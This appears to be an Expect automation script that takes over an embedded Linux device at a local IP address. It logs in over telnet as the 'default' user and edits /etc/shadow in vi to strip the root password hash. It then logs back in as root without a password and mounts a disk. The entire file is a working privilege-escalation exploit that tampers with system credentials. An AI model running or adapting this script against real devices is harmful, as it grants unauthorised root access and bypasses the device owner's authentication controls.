#!/usr/bin/expect

set ip "192.168.178.58"

spawn "/bin/sh"
send "telnet $ip\r"

expect "uclibc login:"
send "default\r"

expect "\$ "
send "vi /etc/shadow\r";
expect "root:"
for {set i 0} {$i < 38} {incr i} {
    send "\033\[C"
}
send "a"
for {set i 0} {$i < 34} {incr i} {
    send "\010"
}
send "\033:wq\r"

expect "$ "
send "exit\r"

expect "sh-5.2\$ "
send "telnet $ip\r"

expect "uclibc login:"
send "root\r"

expect "# "
send "whoami\r"

expect "# "
send "mount /dev/sdc1 /mnt\r"
interact

